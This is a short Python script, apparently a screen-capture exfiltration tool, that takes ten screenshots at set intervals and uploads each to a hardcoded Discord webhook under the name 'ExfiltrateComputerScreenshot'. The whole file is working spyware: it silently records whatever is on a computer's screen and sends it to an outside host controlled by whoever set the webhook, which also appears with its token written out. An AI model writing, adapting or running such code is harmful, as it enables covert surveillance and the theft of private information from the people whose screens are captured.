import pyscreeze
import time
import requests

# YOUR DISCORD WEBHOOK
discord_webhook = "https://discordapp.com/api/webhooks/1162112306231132240/45HVmxFo-2XQ57FTrjfLw2AWSfs1146Dq5E0CMg2gltx4hTlZQCXjjO6OQsVOURf85Na"

# Edit this variables as you want
SCREENSHOTS = 10
TIMING = 5

for i in range(SCREENSHOTS):
    time.sleep(TIMING)

    # take the screenshot
    screenshot = pyscreeze.screenshot()
    screenshot.save("screenshot.png")

    with open("screenshot.png", "rb") as f:
        foto = f.read()

    richiesta = {
        "username": "ExfiltrateComputerScreenshot"
    }

    # Send the message by attaching the photo
    response = requests.post(discord_webhook, data=richiesta, files={"Screen#"+str(i)+".png": foto})

    # Useful for debugging
    # if response.status_code == 200:
    #     print("Photo successfully sent!")
    # else:
    #     print("Error while submitting photo." + str(response.status_code))
